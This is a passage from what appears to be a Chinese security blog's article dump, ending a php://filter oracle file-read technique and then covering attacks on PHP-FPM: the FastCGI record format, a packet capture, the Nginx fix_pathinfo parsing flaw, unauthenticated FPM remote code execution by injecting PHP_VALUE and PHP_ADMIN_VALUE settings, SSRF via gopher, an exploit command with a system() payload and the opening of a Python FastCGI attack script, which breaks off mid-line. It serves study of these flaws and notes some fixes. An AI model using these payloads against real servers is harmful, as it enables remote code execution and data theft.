req(f&#x27;&#123;prefix&#125;|&#x27; + f&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;*(n+1) + f&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;): return &#x27;edcba&#x27;[n] break 使用了 be 编码，作者实际是较长的字符串进行判断的，在处理较长字符串的时候可能存在不可见字符等冗余问题需要去除 n-s i-k v-x借助rot13,可以将n-s转换成a-f 对于i-k在rot1编码规则中会将i-&gt;q,再次使用rot13可以得到d-f 12345678var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930/resource=data:,i&quot;));string(1) &quot;q&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930/resource=data:,j&quot;));string(1) &quot;r&quot;var_dump(file_get_contents(&quot;php://filter/convert.iconv.437.CP930/resource=data:,k&quot;));string(1) &quot;s&quot; 借用rot13,可以将v-x转换成i-k的范围,然后复用上述步骤 此时我们解决了2*6+3*2=18个字母,还剩8个字母与数字来判断 检索数字​ 在 Base64 编码中，因为编码规则都是相对固定的，尤其是相对字符串第一个字节来说，因为在 Base64 分组的时候，第一个字节可以直接编码得到 Base64 编码中的第一位，以 1 为例，如下： 根据前面的我们现在可以判断所有字母了,也可以分清字母和数字了. 所以倘若我们把所有数字提取到第一位,并进行一次base64编码,得到的编码结果我们再去判断第一位是什么字母,就可以大概推出数字的范围: 1230-3 -&gt; M4-7 -&gt; N8-9 -&gt; O 然后我们再使用 r2 交换 Base64 的第二位，因为在 Base64 分组中，Base64 的第二位的高 bit 位仍然受到原文第一个字节的影响，所以根据编码结果第二位的范围我们就可以最终确定这个数字是什么了！例如 0-3 : 12340 -&gt; CDEFGH1 -&gt; STUVWX2 -&gt; ijklmn3 -&gt; yz* 当然仍然有可能编码结果下一位仍然是数字，例如 3s 编码结果为 M3M&#x3D; ，但是根据我们之前把 0-2 都排除了，剩余的就剩下是 3 了，所以依旧可以判断出来。 其余数字类似，就不再赘述。 至此,我们就完成了所有字符的翻译工作了,这个oracle文件读取攻击的原理也被阐述完全了","categories":[{"name":"PHP","slug":"PHP","permalink":"https://m1racle-7.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://m1racle-7.github.io/tags/PHP/"}]},{"title":"攻击PHP-FPM","slug":"攻击PHP-FPM","date":"2024-09-27T02:59:24.811Z","updated":"2024-10-30T11:21:17.753Z","comments":true,"path":"2024/09/27/攻击PHP-FPM/","permalink":"https://m1racle-7.github.io/2024/09/27/%E6%94%BB%E5%87%BBPHP-FPM/","excerpt":"","text":"Nginx与PHP-FPMNginx​ Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务器。 PHP-FPM​ FPM（php-Fastcgi Process Manager）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。故名思义,FPM是管理FastCGI进程的,能够解析fastcgi协议。 ​ 其包含master和worker两种进程.master进程只有一个,负责监听端口,用来接收来自Web Sever请求,而worker进程一般会有多个,每个进程内部都嵌入了一个PHP解释器,是php真正执行的地方. php-fpm默认是unix socket连接,可以在配置文件中修改成tcp连接 Nginx与PHP-FPM通信Nginx通过反向代理将请求转给PHP-FPM解析. CGI与FastCGICGI​ CGI（Common Gateway Interface）通用网关接口,在CGI模式下,当web服务器收到http请求时,就会调用php-cgi进程,通过CGI协议,服务器把请求内容转换成php-cgi能够读懂的协议数据传递给CGI进程,CGI进程拿到内容后就会解析对应的php文件,得到结果在返回给web服务器,由web服务器再返回给客户端. ​ 但是在CGI模式下,每次客户端发起请求都需要建立和销毁进程,导致资源消耗很大.因为http要生成一个动态页面,系统就必须启动一个新进程以运行CGI程序,不断地fork是一项很耗时间和资源的工作,所以诞生了FastCGI模式. FastCGI​ FastCGI (Fast Common Gateway Interface)快速通用网关接口.FastCGi致力于减少网页服务器与CGI程序之间交互的开销,FastCGI每次处理完请求后,不会kill掉这个进程,而是保留进程,从而使服务器可以同时处理更多的网页请求. ​ 简而言之，CGI模式是Apache2接收到请求去调用CGI程序，而FastCGI模式是FastCGI进程自己管理自己的CGI进程，而不再是Apache去主动调用CGI进程，而FastCGI进程又提供了很多辅助功能比如内存管理、垃圾处理、保障了CGI的高效性，并且此时CGI是常驻在内存中、不会每次请求重新启动，从而使得性能得到质的提高. FastCGI协议分析 Tcpdump抓包Nginx中FastCGI协议 Fastcgi record​ FastCGI是一个通信协议,和HTTP协议一样,都是进行数据交换的一个通道. ​ 类比HTTP协议来说,fastcgi协议是服务器中间件和摸个语言后端进行数据交换的协议.fastcgi协议由多个record组成,record也有header和body,服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端,语言后端解码后得到具体数据,进行指定操作,并将结果在按照该协议封装好后返回给服务器中间件. ​ 和HTTP头不同的是,record的头固定8个字节,body是由头中的contentLength指定,结构如下: 1234567891011121314typedef struct &#123; /* Header */ unsigned char version; // 版本 unsigned char type; // 本次record的类型 unsigned char requestIdB1; // 本次record对应的请求id unsigned char requestIdB0; unsigned char contentLengthB1; // body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; // 额外块大小 unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength];&#125; FCGI_Record; ​ Header头由8个uchar类型的变量组成,每个变量1字节.其中,requestld占两个字节,一个是唯一的标志id,用来避免多个请求之间的影响;contenLength占两个字节,表示body的大小. ​ 在语言端解析了fastcgi头以后,拿到contentLength,然后再在TCP流中读取大小等于contentLenth的数据,这就是body体. ​ body后面还以一段额外的数据Padding,其中长度由头中的paddingLength指定,起保留作用.不需要该Padding的时候,将其长度设置为0即可 由此可见,一个fastcgi的record结构最大支持的body大小是2^16,65536字节. Fastcgi type​ 现在再来详细介绍一下fastcgi record中的type字节. ​ type就是指定该record的作用.因为fastcgi的一个record的大小是有限的,作用也是单一的,所以我们需要在一个TCP流中传输多个record,通过type来标志每个record的作用,用requestid作为同义词请求的id. ​ 所以在一次请求中，多个record的requestid是相同的。 type值的具体含义： ​ 看到这个图我们可以知道，在服务器中间件与后端交互时，第一个数据包record的type&#x3D;1，之后继续交互发送type&#x3D;4,5,6,7的record,结束时发送type&#x3D;2,3的record. 当后端语言接收到一个type为4的record后，就会把这个record的body按照对应结构解析成key-value对，这就是php的环境变量，其结构如下： 12345678910111213141516171819202122232425262728293031323334353637383940typedef struct &#123; unsigned char nameLengthB0; /* nameLengthB0 &gt;&gt; 7 == 0 */ unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */ unsigned char nameData[nameLength]; unsigned char valueData[valueLength];&#125; FCGI_NameValuePair11;typedef struct &#123; unsigned char nameLengthB0; /* nameLengthB0 &gt;&gt; 7 == 0 */ unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&#125; FCGI_NameValuePair14;typedef struct &#123; unsigned char nameLengthB3; /* nameLengthB3 &gt;&gt; 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */ unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength];&#125; FCGI_NameValuePair41;typedef struct &#123; unsigned char nameLengthB3; /* nameLengthB3 &gt;&gt; 7 == 1 */ unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */ unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&#125; FCGI_NameValuePair44; 这其实是 4 个结构，至于用哪个结构，有如下规则： key、value均小于128字节，用 FCGI_NameValuePair11 key大于128字节，value小于128字节，用 FCGI_NameValuePair41 key小于128字节，value大于128字节，用 FCGI_NameValuePair14 key、value均大于128字节，用 FCGI_NameValuePair44 抓包流量分析使用tcpdump抓取端口9000的包,追踪其tcp流: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878800000000 01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00 ........ ........00000010 01 04 00 01 05 47 01 00 0c 00 51 55 45 52 59 5f .....G.. ..QUERY_00000020 53 54 52 49 4e 47 0e 04 52 45 51 55 45 53 54 5f STRING.. REQUEST_00000030 4d 45 54 48 4f 44 50 4f 53 54 0c 21 43 4f 4e 54 METHODPO ST.!CONT00000040 45 4e 54 5f 54 59 50 45 61 70 70 6c 69 63 61 74 ENT_TYPE applicat00000050 69 6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 ion/x-ww w-form-u00000060 72 6c 65 6e 63 6f 64 65 64 0e 01 43 4f 4e 54 45 rlencode d..CONTE00000070 4e 54 5f 4c 45 4e 47 54 48 33 0b 06 53 43 52 49 NT_LENGT H3..SCRI00000080 50 54 5f 4e 41 4d 45 2f 31 2e 70 68 70 0b 06 52 PT_NAME/ 1.php..R00000090 45 51 55 45 53 54 5f 55 52 49 2f 31 2e 70 68 70 EQUEST_U RI/1.php000000A0 0c 06 44 4f 43 55 4d 45 4e 54 5f 55 52 49 2f 31 ..DOCUME NT_URI/1000000B0 2e 70 68 70 0d 0d 44 4f 43 55 4d 45 4e 54 5f 52 .php..DO CUMENT_R000000C0 4f 4f 54 2f 76 61 72 2f 77 77 77 2f 68 74 6d 6c OOT/var/ www/html000000D0 0f 08 53 45 52 56 45 52 5f 50 52 4f 54 4f 43 4f ..SERVER _PROTOCO000000E0 4c 48 54 54 50 2f 31 2e 31 0e 04 52 45 51 55 45 LHTTP/1. 1..REQUE000000F0 53 54 5f 53 43 48 45 4d 45 68 74 74 70 11 07 47 ST_SCHEM Ehttp..G00000100 41 54 45 57 41 59 5f 49 4e 54 45 52 46 41 43 45 ATEWAY_I NTERFACE00000110 43 47 49 2f 31 2e 31 0f 0c 53 45 52 56 45 52 5f CGI/1.1. .SERVER_00000120 53 4f 46 54 57 41 52 45 6e 67 69 6e 78 2f 31 2e SOFTWARE nginx/1.00000130 32 30 2e 32 0b 0c 52 45 4d 4f 54 45 5f 41 44 44 20.2..RE MOTE_ADD00000140 52 31 39 32 2e 31 36 38 2e 32 30 2e 31 0b 05 52 R192.168 .20.1..R00000150 45 4d 4f 54 45 5f 50 4f 52 54 36 34 32 35 36 0b EMOTE_PO RT64256.00000160 0a 53 45 52 56 45 52 5f 41 44 44 52 31 37 32 2e .SERVER_ ADDR172.00000170 31 37 2e 30 2e 32 0b 02 53 45 52 56 45 52 5f 50 17.0.2.. SERVER_P00000180 4f 52 54 38 30 0b 09 53 45 52 56 45 52 5f 4e 41 ORT80..S ERVER_NA00000190 4d 45 6c 6f 63 61 6c 68 6f 73 74 0f 03 52 45 44 MElocalh ost..RED000001A0 49 52 45 43 54 5f 53 54 41 54 55 53 32 30 30 0f IRECT_ST ATUS200.000001B0 13 53 43 52 49 50 54 5f 46 49 4c 45 4e 41 4d 45 .SCRIPT_ FILENAME000001C0 2f 76 61 72 2f 77 77 77 2f 68 74 6d 6c 2f 31 2e /var/www /html/1.000001D0 70 68 70 09 0e 48 54 54 50 5f 48 4f 53 54 31 39 php..HTT P_HOST19000001E0 32 2e 31 36 38 2e 32 30 2e 31 32 39 0f 0a 48 54 2.168.20 .129..HT000001F0 54 50 5f 43 4f 4e 4e 45 43 54 49 4f 4e 6b 65 65 TP_CONNE CTIONkee00000200 70 2d 61 6c 69 76 65 13 01 48 54 54 50 5f 43 4f p-alive. .HTTP_CO00000210 4e 54 45 4e 54 5f 4c 45 4e 47 54 48 33 0b 08 48 NTENT_LE NGTH3..H00000220 54 54 50 5f 50 52 41 47 4d 41 6e 6f 2d 63 61 63 TTP_PRAG MAno-cac00000230 68 65 12 08 48 54 54 50 5f 43 41 43 48 45 5f 43 he..HTTP _CACHE_C00000240 4f 4e 54 52 4f 4c 6e 6f 2d 63 61 63 68 65 1e 01 ONTROLno -cache..00000250 48 54 54 50 5f 55 50 47 52 41 44 45 5f 49 4e 53 HTTP_UPG RADE_INS00000260 45 43 55 52 45 5f 52 45 51 55 45 53 54 53 31 0b ECURE_RE QUESTS1.00000270 15 48 54 54 50 5f 4f 52 49 47 49 4e 68 74 74 70 .HTTP_OR IGINhttp00000280 3a 2f 2f 31 39 32 2e 31 36 38 2e 32 30 2e 31 32 ://192.1 68.20.1200000290 39 11 21 48 54 54 50 5f 43 4f 4e 54 45 4e 54 5f 9.!HTTP_ CONTENT_000002A0 54 59 50 45 61 70 70 6c 69 63 61 74 69 6f 6e 2f TYPEappl ication/000002B0 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e x-www-fo rm-urlen000002C0 63 6f 64 65 64 0f 6f 48 54 54 50 5f 55 53 45 52 coded.oH TTP_USER000002D0 5f 41 47 45 4e 54 4d 6f 7a 69 6c 6c 61 2f 35 2e _AGENTMo zilla/5.000002E0 30 20 28 57 69 6e 64 6f 77 73 20 4e 54 20 31 30 0 (Windo ws NT 10000002F0 2e 30 3b 20 57 69 6e 36 34 3b 20 78 36 34 29 20 .0; Win6 4; x64) 00000300 41 70 70 6c 65 57 65 62 4b 69 74 2f 35 33 37 2e AppleWeb Kit/537.00000310 33 36 20 28 4b 48 54 4d 4c 2c 20 6c 69 6b 65 20 36 (KHTM L, like 00000320 47 65 63 6b 6f 29 20 43 68 72 6f 6d 65 2f 31 32 Gecko) C hrome/1200000330 38 2e 30 2e 30 2e 30 20 53 61 66 61 72 69 2f 35 8.0.0.0 Safari/500000340 33 37 2e 33 36 0b 80 00 00 87 48 54 54 50 5f 41 37.36... ..HTTP_A00000350 43 43 45 50 54 74 65 78 74 2f 68 74 6d 6c 2c 61 CCEPTtex t/html,a00000360 70 70 6c 69 63 61 74 69 6f 6e 2f 78 68 74 6d 6c pplicati on/xhtml00000370 2b 78 6d 6c 2c 61 70 70 6c 69 63 61 74 69 6f 6e +xml,app lication00000380 2f 78 6d 6c 3b 71 3d 30 2e 39 2c 69 6d 61 67 65 /xml;q=0 .9,image00000390 2f 61 76 69 66 2c 69 6d 61 67 65 2f 77 65 62 70 /avif,im age/webp000003A0 2c 69 6d 61 67 65 2f 61 70 6e 67 2c 2a 2f 2a 3b ,image/a png,*/*;000003B0 71 3d 30 2e 38 2c 61 70 70 6c 69 63 61 74 69 6f q=0.8,ap plicatio000003C0 6e 2f 73 69 67 6e 65 64 2d 65 78 63 68 61 6e 67 n/signed -exchang000003D0 65 3b 76 3d 62 33 3b 71 3d 30 2e 37 0c 1b 48 54 e;v=b3;q =0.7..HT000003E0 54 50 5f 52 45 46 45 52 45 52 68 74 74 70 3a 2f TP_REFER ERhttp:/000003F0 2f 31 39 32 2e 31 36 38 2e 32 30 2e 31 32 39 2f /192.168 .20.129/00000400 31 2e 70 68 70 14 0d 48 54 54 50 5f 41 43 43 45 1.php..H TTP_ACCE00000410 50 54 5f 45 4e 43 4f 44 49 4e 47 67 7a 69 70 2c PT_ENCOD INGgzip,00000420 20 64 65 66 6c 61 74 65 14 17 48 54 54 50 5f 41 deflate ..HTTP_A00000430 43 43 45 50 54 5f 4c 41 4e 47 55 41 47 45 7a 68 CCEPT_LA NGUAGEzh00000440 2d 43 4e 2c 7a 68 3b 71 3d 30 2e 39 2c 65 6e 3b -CN,zh;q =0.9,en;00000450 71 3d 30 2e 38 0b 80 00 00 fa 48 54 54 50 5f 43 q=0.8... ..HTTP_C00000460 4f 4f 4b 49 45 4a 53 45 53 53 49 4f 4e 49 44 3d OOKIEJSE SSIONID=00000470 41 38 44 35 46 42 34 45 45 42 45 41 43 37 34 44 A8D5FB4E EBEAC74D00000480 42 32 42 37 37 44 41 32 43 31 45 43 35 39 42 42 B2B77DA2 C1EC59BB00000490 3b 20 50 48 50 53 45 53 53 49 44 3d 32 68 63 74 ; PHPSES SID=2hct000004A0 70 62 69 63 63 37 66 68 39 32 37 30 6a 6b 62 75 pbicc7fh 9270jkbu000004B0 6b 63 61 63 62 61 3b 20 73 65 73 73 69 6f 6e 3d kcacba; session=000004C0 65 79 4a 6a 63 33 4a 6d 58 33 52 76 61 32 56 75 eyJjc3Jm X3Rva2Vu000004D0 49 6a 6f 69 4d 7a 45 34 4d 7a 64 69 59 6d 49 78 IjoiMzE4 MzdiYmIx000004E0 4e 32 5a 68 4e 6a 46 6d 4d 6a 6b 32 4f 47 45 33 N2ZhNjFm Mjk2OGE3000004F0 4e 44 51 30 59 7a 6b 78 4d 44 63 32 4e 6a 4a 6c NDQ0Yzkx MDc2NjJl00000500 59 57 59 30 4d 6a 5a 6d 5a 69 49 73 49 6d 6c 6b YWY0MjZm ZiIsImlk00000510 5a 57 35 30 61 58 52 35 49 6a 6f 69 5a 33 56 6c ZW50aXR5 IjoiZ3Vl00000520 63 33 51 69 4c 43 4a 31 63 32 56 79 62 6d 46 74 c3QiLCJ1 c2VybmFt00000530 5a 53 49 36 49 6d 68 6a 61 69 4a 39 2e 5a 74 32 ZSI6Imhj aiJ9.Zt200000540 56 72 41 2e 6d 68 52 5f 5a 67 72 42 35 57 54 50 VrA.mhR_ ZgrB5WTP00000550 37 31 47 45 71 7a 55 68 36 44 78 56 70 73 59 00 71GEqzUh 6DxVpsY.00000560 01 04 00 01 00 00 00 00 01 05 00 01 00 03 05 00 ........ ........00000570 78 3d 31 00 00 00 00 00 01 05 00 01 00 00 00 00 x=1..... ........ 在这个包里能看到许多PHP的SERVER全局变量的参数，把包拆分，第一个包为： 101 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00 其中前8位就是我们上面说的record头,它的意思即： version 为 01 type 为 01，表示这是第一个包 00 01 表示通信 ID 为 1 00 08 表示 body 大小为8 00 00 表示 padding 长度为 0，没有保留字节 后 8 位则是 body，它的意思是： 00 01 为 role，表示 PHP-FPM 接受我们的 HTTP 所关联的信息，并产生个响应role 的取值如下表： | role值 | 具体含义 || —— | ———————————————————— || 1 | 最常用的值，php-fpm接受我们的http所关联的信息，并产生个响应 || 2 | php-fpm会对我们的请求进行认证，认证通过的其会返回响应，认证不通过则关闭请求 || 3 | 过滤请求中的额外数据流，并产生过滤后的http响应 | 00 表示不 keep-alive，在处理完一次请求就关闭 五个 00 为保留字段 从数据包我们可以得知这第一个包进行了一些初始设置,再看第二个包: 101 04 00 01 05 47 01 00 0c 00 51 55 45 52 59 5f 01 为 version 04 说明在这个包中传递了环境参数 00 01 为通信 ID 05 47 说明 body 长度为 0x547，即 1351 01 00 表示 padding 长度为 1,有1字节的填充数据 Key Value QUERY_STRING (空字符串) REQUEST_METHOD POST CONTENT_TYPE application&#x2F;x-www-form-urlencoded CONTENT_LENGTH 3 SCRIPT_NAME &#x2F;1.php REQUEST_URI &#x2F;1.php DOCUMENT_URI &#x2F;1.php DOCUMENT_ROOT &#x2F;var&#x2F;www&#x2F;html SERVER_PROTOCOL HTTP&#x2F;1.1 REQUEST_SCHEME http GATEWAY_INTERFACE CGI&#x2F;1.1 SERVER_SOFTWARE nginx&#x2F;1.20.2 REMOTE_ADDR 192.168.20.1 REMOTE_PORT 64256 SERVER_ADDR 172.17.0.2 SERVER_PORT 80 SERVER_NAME localhost REDIRECT_STATUS 200 SCRIPT_FILENAME &#x2F;var&#x2F;www&#x2F;html&#x2F;1.php HTTP_HOST 192.168.20.129 HTTP_CONNECTION keep-alive HTTP_CONTENT_LENGTH 3 HTTP_PRAGMA no-cache HTTP_CACHE_CONTROL no-cache HTTP_UPGRADE_INSECURE_REQUESTS 1 HTTP_ORIGIN http://192.168.20.129 HTTP_CONTENT_TYPE application&#x2F;x-www-form-urlencoded HTTP_USER_AGENT Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;128.0.0.0 Safari&#x2F;537.36 HTTP_ACCEPT text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,&#x2F;;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7 HTTP_REFERER http://192.168.20.129/1.php HTTP_ACCEPT_ENCODING gzip, deflate HTTP_ACCEPT_LANGUAGE zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8 HTTP_COOKIE JSESSIONID&#x3D;A8D5FB4EEBEAC74DB2B77DA2C1EC59BB; PHPSESSID&#x3D;2hctpbicc7fh9270jkbukcacba; session&#x3D;eyJjc3JmX3Rva2VuIjoiMzE4MzdiYmIxN2ZhNjFmMjk2OGE3NDQ0YzkxMDc2NjJlYWY0MjZmZiIsImlkZW50aXR5IjoiZ3Vlc3QiLCJ1c2VybmFtZSI6ImhjaiJ9.Zt2VrA.mhR_ZgrB5WTP71GEqzUh6DxVpsY x 1 可以看到,type4中传递的这些key-value,和phpinfo中看到的那些一样 实际上,FPM是一个fastcgi协议解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好后通过TCP来将请求发送给FPM.FPM按照fastcgi协议将TCP流解析成真正的数据. type4发送的这些其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php。 然后再看看最后一个包: 1201 04 00 01 00 00 00 00 01 05 00 01 00 03 05 0078 3d 31 00 00 00 00 00 01 05 00 01 00 00 00 00 前面的应该是环境变量参数包的结尾,后面的是type&#x3D;5,POST提交数据的包头,下面是body和post包的结尾. 以上这就是一次Fastcgi请求的包了. Nginx（IIS7）解析漏洞Nginx和IIS7曾经出现过一个PHP相关的解析漏，该漏洞现象是，在用户访问http://127.0.0.1/favicon.ico/.php时，访问到的文件是favicon.ico，但却按照.php后缀解析。 当用户请求http://127.0.0.1/favicon.ico/.php时,nginx会发送如下环境变量到fpm里: 12345678&#123; ... &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, ...&#125; 正常来说这里SCRIPT_FILENAME访问的是一个不存在的文件,但是PHP设置中有一个选项fix_pathinfo导致了 此漏洞.在这个选项被打开的情况下,fpm会判断SCRIPT_FILENAME是否存在,如果不存在则去掉去掉一个&#x2F;及以后的所有内容,并再次判断文件是否存在,循环类推. 也因此,在第一次访问&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php时发现不存在,再次查询&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico发现存在,于是被作为php文件执行,导致解析漏洞. 正确的解决方法有两种，一是在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。 PHP-FPM未授权访问漏洞​ 这个漏洞主要是因为php-fpm对两个进程间通讯没有进行安全性认证,php-fpm默认监听的是9000端口,如果这个端口暴露在公网上,我们就可以构造fastcgi协议来和fpm进行通信,通过构造数据包给环境变量赋值,最终可以达到任意文件执行的目的了. 但是由于在php5.3.9之后加入了fpm增加了security.limit_extensions选项 1234567; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; exectute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions = .php .php3 .php4 .php5 .php7 导致限制了只有这几种文件允许被fpm执行,默认是.php. 由于这个配置项的限制,如果想利用php-fpm的未授权访问漏洞,首先得先找到一个已存在的php文件，不过在安装php的时候，服务器上都会附带一些php后缀的文件，可以使用find / -name &quot;*.php”来搜索一下 可以看到有个老朋友&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php。 PHP-FPM任意代码执行​ 为什么我们前面说控制了fastcgi协议通信的内容，就可以可执行任意php代码呢？ 理论上确实不行，哪怕我们控制了SCRIPT_FILENAME，也是只能执行目标服务器上的文件，并不能任意代码执行。 不过php里面有两个配置项可以解决我们的需求，这两个配置项在学习文件包含中也很常见：auto_prepend_file和auto_append_file。 假如我们设置auto_prepend_file&#x3D;php:&#x2F;&#x2F;input,那么就等于在执行任何php文件前都要包含一遍POST中的内容,所以我们只需要把待执行的代码放在body中,就可以被执行成功了.(不过需要开启远程文件包含选项allow_url_include). 那么我们该如何设置auto_prepend_file的值呢? PHP-FPM中有两个环境变量,PHP_VALUE和PHP_ADMIN_VALUE.这两个环境变量就是用来设置php配置选项的,PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项,disable_function这个选项除外,这个是php加载的时候就确定的. 所以,我们需要最后传入如下环境变量: 123456789101112131415161718&#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;, &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27; &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;&#125; 设置auto_prepend_file &#x3D; php:&#x2F;&#x2F;input且allow_url_include &#x3D; On，然后将我们需要执行的代码放在Body中，即可执行任意代码。 使用P神的脚本python fpm.py 192.168.20.129 /var/www/html/index.php -c &quot;&lt;?php system(&#39;ls /&#39;); exit(); ?&gt;&quot; 完美拿下! 远程打PHP-FPM​ 现在我们已经可以通过PHP_VALUE 和 PHP_ADMIN_VALUE 这两个环境变量设置 PHP 配置选项 auto_prepend_file 和 allow_url_include ，从而使 PHP-FPM 执行我们提供的任意代码.如果PHP-FPM被绑定在公网上,那么任何人都可以伪装成中间件来让php-fpm任意代码执行. 也是使用P神的脚本即可,支持python2与3 SSRF打PHP-FPM使用p神脚本p神脚本是生成tcp流后直接发送,只需要把发送那部分注释掉即可,再把生成的tcp流前面加上gopher 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226#!/usr/bin/python# -*- coding:utf-8 -*-import socketimport randomimport argparseimport sysfrom io import BytesIOfrom six.moves.urllib import parse as urlparse# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, 